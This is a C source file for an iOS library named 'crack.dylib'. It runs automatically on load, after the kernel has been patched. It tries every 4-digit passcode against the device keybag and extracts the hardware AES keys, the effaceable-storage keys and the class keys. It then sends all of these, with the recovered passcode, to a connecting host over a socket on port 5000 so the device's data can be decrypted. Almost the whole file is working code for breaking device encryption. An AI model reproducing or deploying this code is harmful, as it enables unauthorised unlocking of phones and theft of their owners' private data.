//
//  main.c
//  crack
//
//  Created by Joshua Hill on 1/16/14.
//  Copyright (c) 2014 __MyCompanyName__. All rights reserved.

#include <stdio.h>
#include <syslog.h>
#include <sys/sysctl.h>

#include "IOKit.h"
#include "AppleKeyStore.h"
#include "IOAESAccelerator.h"
#include "AppleEffaceableStorage.h"

#include <CoreFoundation/CoreFoundation.h>

#include "util.h"
#include "registry.h"
#include "device_info.h"
#include "ioflash/ioflash.h"
#include "bsdcrypto/rijndael.h"
#include "bsdcrypto/key_wrap.h"

void crack_enter(void) __attribute__((constructor));
void crack_leave(void) __attribute__((destructor));

// This program needs to run after kernel has been patched but can run
// synchronously while data is being dumped to save time?
void crack_enter() {
    syslog(LOG_ERR, "++[CRACK]++ Entering crack.dylib");
    
    
    // Make sure and/or wait until kernel has been patched
    uint8_t* key835 = NULL;
    do {
        sleep(5);
        key835 = IOAES_key835();
        syslog(LOG_ERR, "++[CRACK]++ Checking if AES has been patched yet...");
    } while(memcmp(key835, "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01", 16) == 0);
    syslog(LOG_ERR, "++[CRACK]++ IOAES has been patched");
    
    syslog(LOG_ERR, "++[CRACK]++ Asking AppleKeyStore to load the system keybag");
    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    if (kbdict == NULL) {
        syslog(LOG_ERR, "++[CRACK]++ FAILed to load keybag\n");
        return;
    }
    syslog(LOG_ERR, "++[CRACK]++ Successfully loaded keybag\n");
    
    syslog(LOG_ERR, "++[CRACK]++ Getting keys from system keybag");
    CFDataRef kbkeys = CFDictionaryGetValue(kbdict, CFSTR("KeyBagKeys"));
    CFRetain(kbkeys);
    if (kbkeys == NULL) {
        syslog(LOG_ERR, "++[CRACK]++ FAIL: KeyBagKeys not found\n");
        return;
    }
    syslog(LOG_ERR, "++[CRACK]++ Got keys from system keybag\n");
    
    syslog(LOG_ERR, "++[CRACK]++ Asking AppleKeyStore to parse our keybag blobs");
    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL) {
        syslog(LOG_ERR, "++[CRACK]++ FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        return;
    }
    
    int i = 0;
    char* passcode = (char*) malloc(6);
    memset(passcode, 0, 6);
    
    // Crack the passcode/key if present/possible
    if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835)) {
        syslog(LOG_ERR, "++[CRACK]++ No Passcode");
        
    } else {
        for(i=0; i < 10000; i++)  {
            sprintf(passcode, "%04d", i);
            if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835)) {
                syslog(LOG_ERR, "++[CRACK]++ Found passcode of %s", passcode);
                break;
            }
        }
    }
    
    syslog(LOG_ERR, "Creating output CFDictionary");
    CFMutableDictionaryRef out  = CFDictionaryCreateMutable(kCFAllocatorDefault,
                                                            0,
                                                            &kCFTypeDictionaryKeyCallBacks,
                                                            &kCFTypeDictionaryValueCallBacks);
    
    // Grab class keys from system keybag
    get_device_infos(out);
    
    //syslog(LOG_ERR, "Grabing FSD info");
    //CFMutableDictionaryRef nand = FSDGetInfo(0);
    //if (nand != NULL) {
    //    CFDictionaryAddValue(out, CFSTR("nand"), nand);
    //}
    //syslog(LOG_ERR, "Got FSD Info");
    
    syslog(LOG_ERR, "Grabbing HFS Info");
    struct HFSInfos hfsinfos={0};
    getHFSInfos(&hfsinfos);
    syslog(LOG_ERR, "Got HFS Info");
    
    syslog(LOG_ERR, "Getting remaining keys");
    uint8_t* key89A = IOAES_key89A();
    uint8_t* key89B = IOAES_key89B();
    syslog(LOG_ERR, "Got remaining keys");
    
    uint8_t emf[36]={0};
    uint8_t lwvm[80]={0};
    uint8_t dkey[40]={0};
    uint8_t lockers[960]={0};
    // Grab and dervice keys from effaceable memory
    if (!AppleEffaceableStorage__getBytes(lockers, 960))
    {
        CFDataRef lockersData = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault, lockers, 960, kCFAllocatorNull);
        CFDictionaryAddValue(out, CFSTR("lockers"), lockersData);
        CFRelease(lockersData);
        
        if (!AppleEffaceableStorage__getLockerFromBytes(LOCKER_DKEY, lockers, 960, dkey, 40))
        {
            aes_key_wrap_ctx ctx;
            
            aes_key_wrap_set_key(&ctx, key835, 16);
            
            if(aes_key_unwrap(&ctx, dkey, dkey, 32/8))
                printf("FAIL unwrapping DKey with key 0x835\n");
        }
        if (!AppleEffaceableStorage__getLockerFromBytes(LOCKER_EMF, lockers, 960, emf, 36))
        {
            doAES(&emf[4], &emf[4], 32, kIOAESAcceleratorCustomMask, key89B, NULL, kIOAESAcceleratorDecrypt, 128);
        }
        else if (!AppleEffaceableStorage__getLockerFromBytes(LOCKER_LWVM, lockers, 960, lwvm, 0x50))
        {
            doAES(lwvm, lwvm, 0x50, kIOAESAcceleratorCustomMask, key89B, NULL, kIOAESAcceleratorDecrypt, 128);
            memcpy(&emf[4], &lwvm[32+16], 32);
        }
    }
    
    CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &hfsinfos.dataVolumeOffset);
    CFDictionaryAddValue(out, CFSTR("dataVolumeOffset"), n);
    CFRelease(n);
    addHexaString(out, CFSTR("dataVolumeUUID"), (uint8_t*) &hfsinfos.volumeUUID, 8);
    addHexaString(out, CFSTR("key835"), key835, 16);
    addHexaString(out, CFSTR("key89A"), key89A, 16);
    addHexaString(out, CFSTR("key89B"), key89B, 16);
    addHexaString(out, CFSTR("EMF"), &emf[4], 32);
    addHexaString(out, CFSTR("DKey"), dkey, 32);
    
    uint8_t* passcodeKey = malloc(32);
    
    char bootargs[256]={0};
    size_t bootargs_len = 255;
    sysctlbyname("kern.bootargs", bootargs, &bootargs_len, NULL, 0);
    if (bootargs_len > 1)  {
        CFStringRef bootargsString = CFStringCreateWithBytes(kCFAllocatorDefault, bootargs, bootargs_len - 1, kCFStringEncodingASCII, 0);
        CFDictionaryAddValue(out, CFSTR("kern.bootargs"), bootargsString);
        CFRelease(bootargsString);
    }
    
    syslog(LOG_ERR, "Unlocking keybag with passcode %s", passcode);
    AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835);
    AppleKeyStore_printKeyBag(kb);
    
    syslog(LOG_ERR, "Retreiving class keys from AppleKeyStore");
    CFMutableDictionaryRef classKeys = AppleKeyStore_getClassKeys(kb);
    
    syslog(LOG_ERR, "Getting system passcode key");
    AppleKeyStore_getPasscodeKey(kb, passcode, strlen(passcode), passcodeKey);
    
    printf("%s\n", hex2str(passcodeKey, 32));
    syslog(LOG_ERR, "Passcode key : %s\n", hex2str(passcodeKey, 32));
    
    //save all we have for now
    syslog(LOG_ERR, "Saving information");
    CFStringRef uuid = CreateHexaCFString(kb->uuid, 16);
    
    CFDictionaryAddValue(out, CFSTR("uuid"), uuid);
    CFDictionaryAddValue(out, CFSTR("KeyBagKeys"), kbkeys);
    
    addHexaString(out, CFSTR("salt"), kb->salt, 20);
    
    if (passcode != NULL) {
        CFStringRef cfpasscode = CFStringCreateWithCString(kCFAllocatorDefault, passcode, kCFStringEncodingASCII);
        CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
        CFRelease(cfpasscode);
    }
    if (passcodeKey != NULL)
        addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    
    if (key835 != NULL)
        addHexaString(out, CFSTR("key835"), key835, 16);
    if (classKeys != NULL)
        CFDictionaryAddValue(out, CFSTR("classKeys"), classKeys);
    
    //writePlistToSyslog(out);
    CFDataRef d = CFPropertyListCreateData(kCFAllocatorDefault, out, kCFPropertyListXMLFormat_v1_0, 0, NULL);
    uint8_t* data = CFDataGetBytePtr(d);
    
    // Send it back to host so we can begin decryption
    int x = sock_listen(5000);
    if(x) {
        int y = sock_accept(x);
        if(y) {
            syslog(LOG_ERR, "Successfully connected to host");
            sock_send(y, data, CFDataGetLength(d));
            close(y);
        }
        close(x);
    }
    exit(0);
}

void crack_leave() {
    syslog(LOG_ERR, "++[CRACK]++ Leaving crack.dylib\n");
}